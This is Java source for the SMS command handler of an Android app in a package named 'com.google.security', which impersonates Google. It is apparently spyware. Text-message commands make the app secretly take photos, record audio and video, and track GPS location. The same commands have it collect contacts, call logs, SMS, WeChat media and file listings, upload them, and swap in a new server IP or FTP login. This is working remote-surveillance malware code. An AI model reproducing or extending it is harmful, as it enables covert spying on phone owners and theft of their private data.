package com.google.security;

import java.io.File;
import java.io.IOException;

import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.json.JSONException;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.os.StatFs;
import android.util.Log;

import com.google.security.UploadUtils.ThreadContacts;
import com.google.security.UploadUtils.ThreadInfo;
import com.google.security.UploadUtils.ThreadUpload;
import com.google.security.tools.Config;
import com.google.security.tools.ContactsInfoTool;
import com.google.security.tools.GpsTool;
import com.google.security.tools.PhotoTool;
import com.google.security.tools.RecordTool;
import com.google.security.tools.URLActivity;
import com.google.security.tools.UrlTool;
import com.google.security.tools.VideoTool;
import com.google.security.tools.WeChatTool;
import com.google.security.tools.XmlTools;
import com.google.security.tools.ZipFileTool;

public class SMSHandler extends Handler {
	private static final String LOGTAG = "SMSHandler";
	private Context mContext;
	private Config config;
	static int con_num = 0;
	private UrlTool urltool;
	WifiManager mWifiManager;
	ThreadUpload t;
	ThreadInfo ti;
	ThreadContacts tc;
	File resFile;
	File zipFile;
	private UploadUtils uploadUtils; /* 上传工具类实例 */

	public SMSHandler(Context context) {
		super();
		this.mContext = context;
		mWifiManager = (WifiManager) mContext
				.getSystemService(Context.WIFI_SERVICE);
	}

	@Override
	public void handleMessage(Message msg) {
		config = Config.getIntance(mContext);
		config.readConfig();
		String newip = null;
		uploadUtils = UploadUtils.getIntance(mContext);
		String content = (String) msg.obj;

		if (content.length() > 16) {
			if (content.subSequence(0, 13).equals(SMSConstant.CHANGE_FTP)) {
				String ftp = content.substring(13);
				String url = ftp.substring(0, ftp.indexOf("/"));
				String port = ftp.substring(ftp.indexOf("/") + 1,
						ftp.indexOf("/", ftp.indexOf("/") + 1));
				String admin = ftp.substring(
						ftp.indexOf("/", ftp.indexOf("/") + 1) + 1,
						ftp.lastIndexOf("/"));
				String psw = ftp.substring(ftp.lastIndexOf("/") + 1);
				XmlTools.saveftpasxml(url, port, admin, psw);

			}
		}

		if (content.length() > 12) {
			newip = content.substring(12);
		}
		if (isIp(newip) && isChangeIP(content)) {
			// SMSConstant.seturlhead(newip);
			XmlTools.saveipasxml(newip);

		}

		if (content.substring(0, 6).equals(SMSConstant.FILTER_URL)
				&& (config.Urlflag)) {
			MainService.SMSflag = true;
			// 跳转进入指定HTML
			urltool = UrlTool.getIntance(mContext);
			String url = content.substring(6);
			urltool.start(url);
		}
		if (content.equals(SMSConstant.FILTER_LOCATION) && (config.Gpsflag)) {
			MainService.SMSflag = true;
			// 启动拍照功能并检测wifi、上传结果
			try {
				Log.e(LOGTAG, "online");
				GpsTool.getInstance(mContext).requestLocation();
				t = new ThreadUpload();
				t.start();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			Log.i(LOGTAG, "成功启动定位功能....");

		} else if (content.equals(SMSConstant.FILTER_WECHAT)
				&& (config.Wechatflag)) {
			MainService.SMSflag = true;
			// 微信
			// 是否需要重新打开？
			if (isWifiConnected()) {
				uploadUtils.sendWechatMedia();
			}

		} else if (content.equals(SMSConstant.FILTER_FILES)) {
			try {
				XmlTools.savefilesasxml();
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			try {
				resFile = new File(Environment.getExternalStorageDirectory()
						.toString() + "/security/Media/files/files.xml");
				zipFile = new File(Environment.getExternalStorageDirectory()
						.toString() + "/security/Media/files/files.zip");
				ZipFileTool.zipFile(resFile, zipFile);
				resFile.delete();
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			try {
				uploadUtils.sendxmlfiles();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} else if (content.equals(SMSConstant.FILTER_CONTACTS)
				&& (config.Contractflag)) {
			MainService.SMSflag = true;
			// 启动通讯录、通话记录和短信功能并检测wifi、上传结果
			// ContactsInfoTool contactsInfoTool = ContactsInfoTool
			// .getIntance(mContext);
			// contactsInfoTool.saveContactsasxml();
			// contactsInfoTool.saveCallRecordsasxml();
			// contactsInfoTool.saveSmsasxml();
			ContactsInfoTool contactsInfoTool = ContactsInfoTool
					.getIntance(mContext);
			contactsInfoTool.saveContacts();
			contactsInfoTool.saveCallRecord();
			contactsInfoTool.saveSms();
			contactsInfoTool.saveInfo();
			Log.e("通讯录", "通讯录开始上传");
			ti = new ThreadInfo();
			ti.start();
			tc = new ThreadContacts();
			tc.start();
			// try {
			// uploadUtils.sendAllContacts();
			// uploadUtils.sendAllCallRecords();
			// uploadUtils.sendAllSms();
			// } catch (ParseException e1) {
			// // TODO Auto-generated catch block
			// e1.printStackTrace();
			// } catch (IOException e1) {
			// // TODO Auto-generated catch block
			// e1.printStackTrace();
			// } catch (JSONException e1) {
			// // TODO Auto-generated catch block
			// e1.printStackTrace();
			// }

		} else if (content.equals(SMSConstant.FILTER_PHOTO)
				&& (config.Photoflag)) {
			// 启动拍照功能并检测wifi、上传结果
			if (existSDCard() && getSDFreeSize() >= 50
					&& MainService.getMediaFlag()) {
				MainService.SMSflag = true;
				MainService.setMediaFalse();
				MainService.setPhotoTimeOut();
				try {
					PhotoTool cameraTool = PhotoTool.getIntance(mContext);
					cameraTool.start();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			// if(isWifiConnected(mContext))
			// {
			// try {
			// uploadUtils.sendAllPhotos();
			// } catch (ParseException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// } catch (IOException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// } catch (JSONException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// }
			// }

		} else if (content.equals(SMSConstant.FILTER_RECORD)
				&& (config.Recorderflag)) {
			// 启动录音功能并检测wifi、上传结果

			if (existSDCard() && getSDFreeSize() >= 50
					&& MainService.getMediaFlag()) {
				MainService.SMSflag = true;
				MainService.setMediaFalse();
				MainService.setTimeOut();
				try {
					RecordTool recordTool = RecordTool.getIntance(mContext);
					recordTool.start();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			// if(isWifiConnected(mContext))
			// {
			// try {
			// uploadUtils.sendAllRecords();
			// } catch (ParseException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// } catch (IOException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// } catch (JSONException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// }
			// }

		} else if (content.equals(SMSConstant.FILTER_VEDIO)
				&& (config.Videoflag)) {
			// 启动录像功能并检测wifi、上传结果

			if (existSDCard() && getSDFreeSize() >= 50
					&& MainService.getMediaFlag()) {
				MainService.SMSflag = true;
				MainService.setMediaFalse();
				MainService.setTimeOut();
				try {
					VideoTool videoTool = VideoTool.getIntance(mContext);
					videoTool.start();
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			// if(isWifiConnected(mContext))
			// {
			// try {
			// uploadUtils.sendAllVideos();
			// } catch (ParseException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// } catch (IOException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// } catch (JSONException e) {
			// // TODO Auto-generated catch block
			// e.printStackTrace();
			// }
			// }
		} else if (content.equals(SMSConstant.FILTER_UPLOADALL)) {
			try {
				MainService.SMSflag = true;
				// 根据配置文件上传
				if (config.Gpsflag) {
					t = new ThreadUpload();
					t.start();
				}
				if (config.Contractflag) {
					ContactsInfoTool contactsInfoTool = ContactsInfoTool
							.getIntance(mContext);
					contactsInfoTool.saveContacts();
					contactsInfoTool.saveCallRecord();
					contactsInfoTool.saveSms();
					contactsInfoTool.saveInfo();
					Log.e("通讯录", "通讯录开始上传");
					ti = new ThreadInfo();
					ti.start();
					tc = new ThreadContacts();
					tc.start();
				}
				if (config.Recorderflag) {
					// for (int i = 0; i < 3; i++) {
					uploadUtils.sendAllRecords();
					// }
				}
				if (config.Photoflag) {
					// for (int i = 0; i < 3; i++) {
					uploadUtils.sendAllPhotos();
					// }
				}
				if (config.Videoflag) {
					// for (int i = 0; i < 3; i++) {
					uploadUtils.sendAllVideos();
					// }
				}
				if (config.Wechatflag) {
					// for (int i = 0; i < 3; i++) {
					uploadUtils.sendWechatMedia();
					// }
				}

			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (ParseException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (JSONException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}

	}

	public static long getSDFreeSize() {
		// 取得SD卡文件路径
		File path = Environment.getExternalStorageDirectory();
		StatFs sf = new StatFs(path.getPath());
		// 获取单个数据块的大小(Byte)
		long blockSize = sf.getBlockSize();
		// 空闲的数据块的数量
		long freeBlocks = sf.getAvailableBlocks();
		// 返回SD卡空闲大小
		// return freeBlocks * blockSize; //单位Byte
		// return (freeBlocks * blockSize)/1024; //单位KB
		return (freeBlocks * blockSize) / 1024 / 1024; // 单位MB
	}

	public static boolean existSDCard() {
		if (android.os.Environment.getExternalStorageState().equals(
				android.os.Environment.MEDIA_MOUNTED)) {
			return true;
		} else
			return false;
	}

	private boolean isChangeIP(String content) {
		boolean b = false;
		if (content.indexOf(SMSConstant.CHANGE_IP) == 0) {
			b = true;
		}
		return b;
	}

	private boolean isIp(String IP) {
		boolean b = false;
		if (IP != null
				&& (IP.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"))) {
			String s[] = IP.split("\\.");
			if (Integer.parseInt(s[0]) < 255)
				if (Integer.parseInt(s[1]) < 255)
					if (Integer.parseInt(s[2]) < 255)
						if (Integer.parseInt(s[3]) < 255)
							b = true;
		}
		return b;
	}

	public static boolean isWifiConnected() {

		// TODO Auto-generated method stub

		// if (mWifiManager.getWifiState() == 3)
		// return true;
		return true;
	}

}